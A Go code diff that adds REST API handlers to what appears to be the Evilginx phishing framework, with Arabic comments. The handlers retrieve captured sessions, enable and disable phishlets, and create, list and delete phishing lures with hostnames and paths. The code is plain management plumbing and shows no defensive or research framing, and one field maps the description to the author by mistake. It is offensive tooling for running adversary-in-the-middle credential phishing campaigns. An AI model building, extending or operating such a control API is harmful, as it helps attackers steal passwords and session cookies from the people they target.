@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -172,7 +171,7 @@ func (as *ApiServer) loginHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func (as *ApiServer) getSessionsHandler(w http.ResponseWriter, r *http.Request) {
-	sessions, err := as.db.GetSessions()
+	sessions, err := as.db.ListSessions()
 	if err != nil {
 		as.jsonError(w, "خطأ في استرجاع الجلسات", http.StatusInternalServerError)
 		return
@@ -186,10 +185,18 @@ func (as *ApiServer) getSessionHandler(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	id := vars["id"]
 	
-	session, err := as.db.GetSession(id)
+	sessions, err := as.db.ListSessions()
 	if err != nil {
-		as.jsonError(w, "خطأ في استرجاع الجلسة", http.StatusInternalServerError)
+		as.jsonError(w, "خطأ في استرجاع الجلسات", http.StatusInternalServerError)
 		return
+	}
+	
+	var session *database.Session
+	for _, s := range sessions {
+		if s.SessionId == id {
+			session = s
+			break
+		}
 	}
 	
 	if session == nil {
@@ -558,4 +565,213 @@ const loginHTML = `<!DOCTYPE html>
         });
     </script>
 </body>
-</html>` 
+</html>`
+
+// معالج الإعدادات
+func (as *ApiServer) configsHandler(w http.ResponseWriter, r *http.Request) {
+	config := map[string]interface{}{
+		"domain":       as.cfg.general.Domain,
+		"ip":           as.cfg.general.ExternalIpv4,
+		"redirect_url": as.cfg.general.UnauthUrl,
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Data:    config,
+	})
+}
+
+// معالج قائمة Phishlets
+func (as *ApiServer) phishletsHandler(w http.ResponseWriter, r *http.Request) {
+	phishlets := []map[string]interface{}{}
+	
+	for _, p := range as.cfg.phishlets {
+		phishletData := map[string]interface{}{
+			"name":        p.Name,
+			"author":      p.Author,
+			"description": p.Author,
+			"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
+			"domains":     p.domains,
+		}
+		phishlets = append(phishlets, phishletData)
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Data:    phishlets,
+	})
+}
+
+// معالج تفاصيل Phishlet محدد
+func (as *ApiServer) phishletHandler(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+	
+	p, err := as.cfg.GetPhishlet(name)
+	if err != nil {
+		as.jsonError(w, err.Error(), http.StatusNotFound)
+		return
+	}
+	
+	phishletData := map[string]interface{}{
+		"name":        p.Name,
+		"author":      p.Author,
+		"description": p.Author,
+		"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
+		"domains":     p.domains,
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Data:    phishletData,
+	})
+}
+
+// معالج تفعيل Phishlet
+func (as *ApiServer) phishletEnableHandler(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+	
+	err := as.cfg.SetSiteEnabled(name)
+	if err != nil {
+		as.jsonError(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: fmt.Sprintf("Phishlet '%s' enabled", name),
+	})
+}
+
+// معالج تعطيل Phishlet
+func (as *ApiServer) phishletDisableHandler(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+	
+	err := as.cfg.SetSiteDisabled(name)
+	if err != nil {
+		as.jsonError(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: fmt.Sprintf("Phishlet '%s' disabled", name),
+	})
+}
+
+// معالج قائمة وإنشاء Lures
+func (as *ApiServer) luresHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method == "GET" {
+		// الحصول على قائمة Lures
+		lures := as.cfg.lures
+		
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Data:    lures,
+		})
+	} else if r.Method == "POST" {
+		// إنشاء Lure جديد
+		var lureData map[string]interface{}
+		
+		err := json.NewDecoder(r.Body).Decode(&lureData)
+		if err != nil {
+			as.jsonError(w, "Invalid JSON", http.StatusBadRequest)
+			return
+		}
+		
+		phishletName, ok := lureData["phishlet"].(string)
+		if !ok || phishletName == "" {
+			as.jsonError(w, "Phishlet name is required", http.StatusBadRequest)
+			return
+		}
+		
+		_, err = as.cfg.GetPhishlet(phishletName)
+		if err != nil {
+			as.jsonError(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		
+		hostname, _ := lureData["hostname"].(string)
+		path, _ := lureData["path"].(string)
+		
+		// إنشاء Lure جديد بإعدادات افتراضية
+		lure := &Lure{
+			Phishlet:        phishletName,
+			Hostname:        hostname,
+			Path:            path,
+			RedirectUrl:     "",
+			Redirector:      "",
+			UserAgentFilter: "",
+			Info:            "",
+			OgTitle:         "",
+			OgDescription:   "",
+			OgImageUrl:      "",
+			OgUrl:           "",
+			PausedUntil:     0,
+		}
+		
+		as.cfg.AddLure(phishletName, lure)
+		
+		// البحث عن معرف الـ Lure الذي تم إنشاؤه
+		var lureIndex int = -1
+		for i, l := range as.cfg.lures {
+			if l.Phishlet == phishletName && l.Hostname == hostname && l.Path == path {
+				lureIndex = i
+				break
+			}
+		}
+		
+		if lureIndex == -1 {
+			as.jsonError(w, "Failed to find created lure", http.StatusInternalServerError)
+			return
+		}
+		
+		lure, _ = as.cfg.GetLure(lureIndex)
+		
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Message: fmt.Sprintf("Created lure with ID: %d", lureIndex),
+			Data:    lure,
+		})
+	}
+}
+
+// معالج تفاصيل وحذف Lure محدد
+func (as *ApiServer) lureHandler(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	idStr := vars["id"]
+	
+	id, err := as.getLureId(idStr)
+	if err != nil {
+		as.jsonError(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+	
+	if r.Method == "GET" {
+		// الحصول على تفاصيل Lure
+		lure, err := as.cfg.GetLure(id)
+		if err != nil {
+			as.jsonError(w, err.Error(), http.StatusNotFound)
+			return
+		}
+		
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Data:    lure,
+		})
+	} else if r.Method == "DELETE" {
+		// حذف Lure
+		err = as.cfg.DeleteLure(id)
+		if err != nil {
+			as.jsonError(w, err.Error(), http.StatusNotFound)
+			return
+		}
+		
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Message: fmt.Sprintf("Lure %d deleted", id),
+		})
+	}
+} 
